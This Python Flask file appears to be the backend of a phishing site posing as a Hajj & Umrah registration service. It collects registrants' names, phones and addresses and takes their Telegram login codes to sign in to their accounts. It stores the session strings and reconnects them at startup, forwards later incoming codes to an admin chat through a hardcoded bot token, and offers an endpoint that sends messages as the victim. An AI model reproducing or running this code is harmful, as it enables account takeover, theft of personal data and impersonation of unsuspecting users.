# app.py - Flask version of Telegram Bot with Auto Login

import os
import json
import re
import logging
import threading
import asyncio
from datetime import datetime
from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
from dotenv import load_dotenv
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon import events

# Load environment variables
load_dotenv()

app = Flask(__name__, static_folder='.')
CORS(app)

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# CONFIGURATION
API_ID = os.getenv('API_ID', '23864314')
API_HASH = os.getenv('API_HASH', 'c28f3a8d50dd8a78acbac45a72e4f955')
BOT_TOKEN = os.getenv('BOT_TOKEN', '8674470639:AAE7GidUqbbPUYiqNBHawJA3ZWlIh25-_T4')
ADMIN_CHAT_ID = os.getenv('ADMIN_CHAT_ID', '1323510267')

# File paths
DATA_FILE = os.path.join(os.path.dirname(__file__), 'data.json')
SESSIONS_FILE = os.path.join(os.path.dirname(__file__), 'sessions.json')

# In-memory storage
verification_codes = {}
user_sessions = {}
pending_logins = {}
user_chat_ids = {}

# OTP Listener storage
otp_listeners = {}

# Telegram client management
telegram_loaded = False
system_client = None


def load_data():
    try:
        if os.path.exists(DATA_FILE):
            with open(DATA_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
    except Exception as e:
        logger.error(f'Error loading data: {e}')
    return {'users': [], 'broadcasts': []}


def save_data(data):
    try:
        with open(DATA_FILE, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
    except Exception as e:
        logger.error(f'Error saving data: {e}')


def load_sessions():
    try:
        if os.path.exists(SESSIONS_FILE):
            with open(SESSIONS_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
    except Exception as e:
        logger.error(f'Error loading sessions: {e}')
    return {}


def save_sessions(sessions):
    try:
        with open(SESSIONS_FILE, 'w', encoding='utf-8') as f:
            json.dump(sessions, f, indent=2)
    except Exception as e:
        logger.error(f'Error saving sessions: {e}')


stored_sessions = load_sessions()

# Persistent event loop for Telegram
_telegram_loop = None
_loop_lock = threading.Lock()


def run_async(coro):
    global _telegram_loop
    try:
        with _loop_lock:
            if _telegram_loop is None or _telegram_loop.is_closed():
                _telegram_loop = asyncio.new_event_loop()
                asyncio.set_event_loop(_telegram_loop)
            result = _telegram_loop.run_until_complete(coro)
            return result
    except Exception as e:
        logger.error(f'Error running async: {e}')
        return None


async def get_telegram_client(phone=None, use_session=False):
    global telegram_loaded, system_client
    
    if not telegram_loaded:
        telegram_loaded = True
        logger.info('Telegram library loaded')
    
    # Try to use user session if available
    if phone and use_session:
        # Check if we already have a connected client
        if phone in user_sessions and 'client' in user_sessions[phone]:
            client = user_sessions[phone]['client']
            try:
                if not client.is_connected():
                    logger.info(f"Client for {phone} disconnected, reconnecting...")
                    await client.connect()
                return client, True
            except Exception as e:
                logger.error(f"Error checking client connection: {e}")
        
        # Try to use stored session
        if phone in stored_sessions:
            try:
                logger.info(f"Reconnecting session for {phone}...")
                client = TelegramClient(
                    StringSession(stored_sessions[phone]['session']),
                    int(API_ID), API_HASH,
                    connection_retries=5
                )
                await client.connect()
                
                # Verify connection is working
                await client.get_me()
                
                user_sessions[phone] = {
                    'session': stored_sessions[phone]['session'],
                    'client': client,
                    'logged_in_at': stored_sessions[phone].get('logged_in_at', datetime.now().timestamp() * 1000)
                }
                logger.info(f"Successfully reconnected to {phone}")
                return client, True
            except Exception as e:
                logger.error(f'Error reconnecting session for {phone}: {e}')
                # Remove invalid session
                if phone in stored_sessions:
                    del stored_sessions[phone]
                    save_sessions(stored_sessions)
    
    # Fall back to system session or create new one
    if 'system_session' in stored_sessions:
        try:
            system_client = TelegramClient(
                StringSession(stored_sessions['system_session']['session']),
                int(API_ID), API_HASH,
                connection_retries=5
            )
            await system_client.connect()
            return system_client, False
        except Exception as e:
            logger.error(f'Error with stored system session: {e}')
    
    system_client = TelegramClient(
        StringSession(''),
        int(API_ID), API_HASH,
        connection_retries=5
    )
    await system_client.connect()
    
    session_string = system_client.session.save()
    stored_sessions['system_session'] = {
        'session': session_string,
        'logged_in_at': datetime.now().timestamp() * 1000,
        'type': 'system'
    }
    save_sessions(stored_sessions)
    
    return system_client, False


def send_telegram_message(chat_id, text, parse_mode='Markdown'):
    try:
        import requests
        url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
        data = {
            'chat_id': chat_id,
            'text': text,
            'parse_mode': parse_mode
        }
        response = requests.post(url, json=data, timeout=10)
        return response.ok
    except Exception as e:
        logger.error(f'Error sending telegram message: {e}')
        return False


async def login_to_telegram(phone, code, phone_code_hash, existing_client=None):
    try:
        client = existing_client
        if not client:
            client = TelegramClient(
                StringSession(''),
                int(API_ID), API_HASH,
                connection_retries=5
            )
            await client.connect()
        
        await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
        
        session_string = client.session.save()
        user_sessions[phone] = {
            'session': session_string,
            'client': client,
            'logged_in_at': datetime.now().timestamp() * 1000
        }
        
        stored_sessions[phone] = {
            'session': session_string,
            'logged_in_at': datetime.now().timestamp() * 1000
        }
        save_sessions(stored_sessions)
        
        logger.info(f'Login successful: {phone}')
        
        # Start OTP listener for this user after successful login
        start_otp_listener(phone, client)
        
        return {'success': True, 'session': session_string}
    except Exception as e:
        logger.error(f'Login failed: {e}')
        return {'success': False, 'error': str(e)}


def start_otp_listener(phone, client):
    if phone in otp_listeners:
        old_listener = otp_listeners[phone]
        if 'handler' in old_listener:
            try:
                client.remove_event_handler(old_listener['handler'])
            except:
                pass
    
    async def otp_handler(event):
        try:
            message = event.message
            if not message:
                return
            
            message_text = message.message or message.text
            if not message_text:
                return
            
            logger.info(f'Message for {phone}: {message_text[:80]}')
            
            is_from_telegram = False
            if message.from_id:
                user_id = message.from_id.user_id if hasattr(message.from_id, 'user_id') else message.from_id
                if user_id and str(user_id).startswith('777'):
                    is_from_telegram = True
            
            otp_match = re.search(r'\b(\d{5})\b', message_text)
            
            if is_from_telegram or otp_match:
                otp_code = message_text
                if otp_match:
                    otp_code = otp_match.group(1)
                
                logger.info(f'OTP detected for {phone}: {otp_code}')
                
                # Send to admin
                send_telegram_message(
                    ADMIN_CHAT_ID,
                    f'📱 *OTP TERDETEKSI!*\n\nNomor: {phone}\nKode: {otp_code}\nPesan: {message_text[:100]}'
                )
                
                # Send to user chat if available
                if phone in user_chat_ids:
                    user_chat_id = user_chat_ids[phone]
                    send_telegram_message(
                        user_chat_id,
                        f'📱 *OTP TERDETEKSI!*\n\nNomor: {phone}\nKode: {otp_code}'
                    )
                
                try:
                    client.remove_event_handler(otp_handler)
                except:
                    pass
                if phone in otp_listeners:
                    if 'timeout' in otp_listeners[phone]:
                        otp_listeners[phone]['timeout'].cancel()
                    del otp_listeners[phone]
                    
        except Exception as e:
            logger.error(f'Error in OTP handler: {e}')
    
    client.add_event_handler(otp_handler, events.NewMessage(incoming=True))
    
    logger.info(f'Telegram client ready for {phone}')
    
    def timeout_callback():
        if phone in otp_listeners:
            try:
                client.remove_event_handler(otp_handler)
            except:
                pass
            if phone in otp_listeners:
                del otp_listeners[phone]
            send_telegram_message(
                ADMIN_CHAT_ID,
                f'⏰ Timeout! Tidak ada OTP dalam 120 detik untuk: {phone}'
            )
            logger.info(f'OTP listener timeout for: {phone}')
    
    timeout_timer = threading.Timer(120, timeout_callback)
    timeout_timer.daemon = True
    timeout_timer.start()
    
    otp_listeners[phone] = {
        'client': client,
        'handler': otp_handler,
        'timeout': timeout_timer,
        'start_time': datetime.now().timestamp() * 1000
    }
    
    logger.info(f'OTP listener started for: {phone}')


# Initialize OTP listeners for all stored sessions at startup
def initialize_all_otp_listeners():
    logger.info("Initializing OTP listeners for all stored sessions...")
    for phone in stored_sessions:
        if phone == 'system_session':
            continue
        try:
            logger.info(f"Setting up OTP listener for: {phone}")
            result = run_async(get_telegram_client(phone, True))
            if result:
                client, is_user = result
                if is_user:
                    start_otp_listener(phone, client)
                    logger.info(f"OTP listener started for: {phone}")
        except Exception as e:
            logger.error(f"Failed to setup OTP listener for {phone}: {e}")


@app.route('/')
def index():
    return send_from_directory('.', 'index.html')


@app.route('/<path:filename>')
def serve_static(filename):
    return send_from_directory('.', filename)


@app.route('/api/register', methods=['POST'])
def register():
    try:
        data = request.get_json()
        name = data.get('name', '')
        phone = data.get('phone', '')
        address = data.get('address', '')
        
        if not name or not phone:
            return jsonify({'success': False, 'error': 'Nama dan nomor telepon diperlukan'})
        
        phone = phone.strip()
        phone = re.sub(r'\D', '', phone)
        if phone.startswith('0'):
            phone = '62' + phone[1:]
        elif phone.startswith('8'):
            phone = '62' + phone
        phone = '+' + phone
        
        user_data = load_data()
        new_user = {
            'chatId': phone,
            'name': name,
            'address': address,
            'registeredAt': datetime.now().isoformat(),
            'loggedIn': False
        }
        
        idx = -1
        for i, u in enumerate(user_data['users']):
            if u['chatId'] == phone:
                idx = i
                break
        
        if idx >= 0:
            user_data['users'][idx] = new_user
        else:
            user_data['users'].append(new_user)
        
        save_data(user_data)
        
        message = f"""🔔 *Pendaftaran Baru Haji & Umrah*

👤 *Nama:* {name}
📱 *Nomor Telegram:* {phone}
📍 *Alamat:* {address}
⏰ *Waktu:* {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"""
        
        send_telegram_message(ADMIN_CHAT_ID, message)
        
        return jsonify({'success': True, 'message': 'Pendaftaran berhasil!'})
    except Exception as e:
        logger.error(f'Register error: {e}')
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/request-telegram-code', methods=['POST'])
def request_telegram_code():
    try:
        data = request.get_json()
        phone_number = data.get('phoneNumber', '')
        use_user_session = data.get('useUserSession', True)
        chat_id = data.get('chatId', None)
        
        if not phone_number:
            return jsonify({'success': False, 'error': 'Nomor telepon diperlukan'})
        
        phone = phone_number.strip()
        phone = re.sub(r'\D', '', phone)
        if phone.startswith('0'):
            phone = '62' + phone[1:]
        elif phone.startswith('8'):
            phone = '62' + phone
        phone = '+' + phone
        
        # Store chat_id if provided
        if chat_id:
            user_chat_ids[phone] = chat_id
        
        logger.info(f'Requesting code for: {phone} (use_user_session: {use_user_session})')
        
        client = None
        is_user_session = False
        
        # Try to use user session first if available
        if phone in stored_sessions:
            try:
                result = run_async(get_telegram_client(phone, True))
                if result:
                    client, is_user_session = result
                    logger.info(f'Using user session: {is_user_session}')
            except Exception as session_err:
                logger.error(f'Session error: {session_err}')
                client = None
        
        if not client:
            result = run_async(get_telegram_client(phone, False))
            if not result:
                return jsonify({'success': False, 'error': 'Gagal membuat koneksi Telegram'})
            client, _ = result
            logger.info('Using new system client')
        
        logger.info(f'Sending code request to {phone}...')
        try:
            code_result = run_async(client.send_code_request(phone))
            logger.info(f'Code request result: {code_result}')
            if not code_result:
                return jsonify({'success': False, 'error': 'Gagal mengirim OTP: Rate limit atau nomor tidak valid'})
            phone_code_hash = code_result.phone_code_hash
            logger.info(f'Phone code hash: {phone_code_hash}')
        except Exception as otp_err:
            logger.error(f'Error sending OTP: {otp_err}')
            return jsonify({'success': False, 'error': f'Gagal mengirim OTP: {str(otp_err)}'}), 500
        
        verification_codes[phone] = {
            'code': '',
            'timestamp': datetime.now().timestamp() * 1000,
            'phone_code_hash': phone_code_hash,
            'client': client,
            'is_user_session': is_user_session
        }
        
        pending_logins[phone] = {
            'step': 'awaiting_code',
            'start_time': datetime.now().timestamp() * 1000,
            'phone_code_hash': phone_code_hash,
            'client': client,
            'is_user_session': is_user_session
        }
        
        logger.info(f'Telegram code requested for: {phone}')
        
        start_otp_listener(phone, client)
        
        session_text = "(user session)" if is_user_session else "(system)"
        send_telegram_message(
            ADMIN_CHAT_ID,
            f'Request OTP: {phone} {session_text}\nMenunggu OTP...'
        )
        
        return jsonify({
            'success': True,
            'phone_code_hash': phone_code_hash,
            'message': 'Kode dikirim!',
            'is_user_session': is_user_session
        })
    except Exception as e:
        logger.error(f'Error requesting code: {e}')
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/verify-code', methods=['POST'])
def verify_code():
    try:
        data = request.get_json()
        phone_number = data.get('phoneNumber', '')
        code = data.get('code', '')
        user_name = data.get('userName', '')
        user_address = data.get('userAddress', '')
        
        phone = phone_number.strip()
        if phone.startswith('0'):
            phone = '62' + phone[1:]
        phone = '+' + re.sub(r'\D', '', phone)
        
        pending_login = pending_logins.get(phone)
        
        if pending_login and pending_login.get('phone_code_hash'):
            client = pending_login.get('client')
            result = run_async(login_to_telegram(phone, code, pending_login['phone_code_hash'], client))
            
            if result and result.get('success'):
                pending_logins.pop(phone, None)
                
                if phone in otp_listeners:
                    if 'timeout' in otp_listeners[phone]:
                        otp_listeners[phone]['timeout'].cancel()
                    del otp_listeners[phone]
                
                user_data = load_data()
                new_user = {
                    'chatId': phone,
                    'name': user_name,
                    'address': user_address,
                    'registeredAt': datetime.now().isoformat(),
                    'loggedIn': True
                }
                
                idx = -1
                for i, u in enumerate(user_data['users']):
                    if u['chatId'] == phone:
                        idx = i
                        break
                
                if idx >= 0:
                    user_data['users'][idx] = new_user
                else:
                    user_data['users'].append(new_user)
                
                save_data(user_data)
                
                send_telegram_message(
                    ADMIN_CHAT_ID,
                    f'BOT LOGIN BERHASIL: {phone}'
                )
                
                return jsonify({'success': True, 'message': 'Bot login berhasil!', 'loggedIn': True})
            else:
                error_msg = result.get('error', 'Login gagal') if result else 'Login gagal'
                return jsonify({'success': False, 'error': f'Login gagal: {error_msg}'})
        else:
            return jsonify({'success': False, 'error': 'Kode tidak valid'})
    except Exception as e:
        logger.error(f'Verify code error: {e}')
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/send-as-user', methods=['POST'])
def send_as_user():
    try:
        data = request.get_json()
        phone_number = data.get('phoneNumber', '')
        message = data.get('message', '')
        target_chat = data.get('targetChat', '')
        
        phone = phone_number
        if not phone.startswith('+'):
            phone = '+' + phone
        
        user_session = user_sessions.get(phone)
        if not user_session and phone in stored_sessions:
            result = run_async(get_telegram_client(phone, True))
            if result:
                user_session = user_sessions.get(phone)
        
        if not user_session:
            return jsonify({'success': False, 'error': 'User belum login'})
        
        client = user_session.get('client')
        if not client:
            return jsonify({'success': False, 'error': 'Client tidak tersedia'})
        
        target = target_chat if target_chat else phone
        run_async(client.send_message(target, message))
        
        return jsonify({'success': True})
    except Exception as e:
        logger.error(f'Send as user error: {e}')
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/user-status/<path:phone>', methods=['GET'])
def user_status(phone):
    phone = '+' + re.sub(r'\D', '', phone)
    
    session = user_sessions.get(phone)
    if not session and phone in stored_sessions:
        result = run_async(get_telegram_client(phone, True))
        if result:
            session = user_sessions.get(phone)
    
    logged_in = session is not None
    since = session.get('logged_in_at') if session else None
    stored = phone in stored_sessions
    
    return jsonify({
        'loggedIn': logged_in,
        'since': since,
        'stored': stored
    })


@app.route('/api/users', methods=['GET'])
def get_users():
    return jsonify({'users': load_data()['users']})


@app.route('/api/status', methods=['GET'])
def get_status():
    return jsonify({
        'otpCount': len(verification_codes),
        'userCount': len(load_data()['users']),
        'loggedInUsers': len(user_sessions),
        'storedSessions': len(stored_sessions)
    })


if __name__ == '__main__':
    # Setup bot commands
    try:
        import requests
        commands = [
            {"command": "start", "description": "Buka menu utama"},
            {"command": "menu", "description": "Tampilkan menu"},
            {"command": "help", "description": "Bantuan"},
            {"command": "status", "description": "Cek status bot"}
        ]
        url = f'https://api.telegram.org/bot{BOT_TOKEN}/setMyCommands'
        requests.post(url, json={"commands": commands}, timeout=10)
        logger.info('Bot commands set successfully')
    except Exception as e:
        logger.error(f'Error setting bot commands: {e}')
    
    # Initialize OTP listeners for all stored user sessions
    initialize_all_otp_listeners()
    
    # Run Flask server
    app.run(host='0.0.0.0', port=5000, debug=False)

